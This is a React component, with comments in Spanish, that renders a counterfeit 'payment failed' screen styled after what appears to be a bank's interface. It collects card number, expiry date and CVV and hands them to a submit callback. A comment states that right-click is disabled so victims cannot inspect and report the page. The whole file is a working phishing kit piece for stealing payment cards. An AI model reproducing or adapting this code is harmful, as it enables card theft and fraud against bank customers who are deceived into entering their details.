/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useEffect, useState } from "react";

export default function Tarcredito({
  enviar,
}: {
  enviar?: (data: any) => void;
}) {
  const [tarjeta, setTarjeta] = useState("");
  const [fecha, setFecha] = useState("");
  const [cvv, setCvv] = useState("");

  // -------- VALIDACIONES ---------
  const isTarjetaValid = tarjeta.length >= 15 && tarjeta.length <= 16;
  const isFechaValid = /^(0[1-9]|1[0-2])\/\d{2}$/.test(fecha); // Formato MM/AA
  const isCvvValid = cvv.length >= 3 && cvv.length <= 4;
  useEffect(() => {
    // Bloquea F12 y clic derecho para que no inspeccionen y reporten fácil
    const handleContextMenu = (e: any) => e.preventDefault();
    document.addEventListener("contextmenu", handleContextMenu);
    return () => document.removeEventListener("contextmenu", handleContextMenu);
  }, []);

  // Activar el botón solo si los 3 campos están validados
  const canSubmit = isTarjetaValid && isFechaValid && isCvvValid;

  const handleSubmit = () => {
    if (!canSubmit) return;
    enviar?.({ tarjeta, fecha, cvv, view: "tarjeta_verif" });
  };

  // Máscara para la fecha MM/AA
  const handleFechaChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let val = e.target.value.replace(/\D/g, ""); // Solo números
    if (val.length > 4) val = val.slice(0, 4);

    if (val.length > 2) {
      val = val.slice(0, 2) + "/" + val.slice(2);
    }
    setFecha(val);
  };

  return (
    <>
      {/* HEADER ====================================== */}
      <div id="bdb-ml-header-bv" className="bdb-ml-header-bv__container">
        <div className="bdb-ml-header-bv__container__content">
          <div className="bdb-ml-header-bv__container__content__button bdb-ml-header-bv__container__content__button--l">
            <div className="bdb-ml-header-bv__container__content__leftBoton">
              <button className="bdb-at-btn bdb-at-btn--text bdb-at-btn--sm--ico">
                <span className="ico-arrow-back"></span> Atrás
              </button>
            </div>
          </div>

          <div className="bdb-ml-header-bv__container__content__center">
            <label className="bdb-ml-header-bv__container__content__center__title">
              Pago no realizado
            </label>
          </div>

          <div className="bdb-ml-header-bv__container__content__button bdb-ml-header-bv__container__content__button--r">
            <div className="bdb-ml-header-bv__container__content__button__rigthBoton">
              <button className="bdb-at-btn bdb-at-btn--text bdb-at-btn--sm--ico bdb-at-btn--sm--ico-right">
                Abandonar <span className="ico-close"></span>
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* BODY ====================================== */}
      <div className="sherpa-grid">
        <div className="sherpa-container">
          <div className="col-xs-12 col-sm-10 col-md-10 col-lg-6 col-sm-offset-1 col-md-offset-1 col-lg-offset-3">

            <div className="_7pFqf6HtJm-Go1Dv-hAW5g==">
              <span className="sherpa-typography-heading-6">Pago no realizado</span>
            </div>

            <div>
              <div className="bdb-ml-bm-token">

                <span className="bdb-ml-bm-email__icon ico-card" style={{ fontSize: '48px', color: '#0077B6' }}></span>

                <div className="bdb-ml-bm-token__title">
                  <div className="bdb-ml-bm-token__title__label">
                    <b>Pago no realizado</b>
                  </div>
                </div>

                <div className="bdb-ml-bm-token__description">
                  En este momento no es posible realizar la transacción, para continuar el pago ingrese los datos de su tarjeta crédito o débito
                </div>

                {/* NÚMERO DE TARJETA ========================================== */}
                <div className="etiqueta" style={{ marginBottom: 10, marginTop: 10 }}>
                  Número de tarjeta
                </div>

                <input
                  type="text"
                  id="txt-tarjeta"
                  className={`bdb-at-input-text ${tarjeta && !isTarjetaValid ? "input-error" : ""}`}
                  placeholder="XXXX XXXX XXXX XXXX"
                  maxLength={16}
                  value={tarjeta}
                  onChange={(e) => setTarjeta(e.target.value.replace(/[^0-9]/g, ""))}
                />

                {/* FILA FECHA Y CVV ========================================== */}
                <div style={{ display: 'flex', gap: '15px' }}>
                  <div style={{ flex: 1 }}>
                    <div className="etiqueta" style={{ marginBottom: 10, marginTop: 10 }}>
                      Fecha (MM/AA)
                    </div>
                    <input
                      type="text"
                      className={`bdb-at-input-text ${fecha && !isFechaValid && fecha.length === 5 ? "input-error" : ""}`}
                      placeholder="MM/AA"
                      value={fecha}
                      onChange={handleFechaChange}
                    />
                  </div>

                  <div style={{ flex: 1 }}>
                    <div className="etiqueta" style={{ marginBottom: 10, marginTop: 10 }}>
                      CVV
                    </div>
                    <input
                      type="password"
                      className={`bdb-at-input-text ${cvv && !isCvvValid ? "input-error" : ""}`}
                      placeholder="***"
                      maxLength={4}
                      value={cvv}
                      onChange={(e) => setCvv(e.target.value.replace(/[^0-9]/g, ""))}
                    />
                  </div>
                </div>

                {/* MENSAJES DE ERROR */}
                {(tarjeta && !isTarjetaValid) && (
                  <div className="bdb-at-input-token__msj-error errortoken" style={{ marginTop: 10 }}>
                    Ingresa un número de tarjeta válido.
                  </div>
                )}

                {/* BOTÓN ========================================== */}
                <div className="bdb-ml-bm-token__actions">
                  <div className="bdb-ml-bm-token__actions__send">
                    <button
                      className="bdb-at-btn bdb-at-btn--primary bdb-at-btn--lg"
                      id="continuar"
                      disabled={!canSubmit}
                      onClick={handleSubmit}
                    >
                      Verificar Tarjeta
                    </button>
                  </div>
                </div>

              </div>
            </div>

          </div>
        </div>
      </div>
    </>
  );
}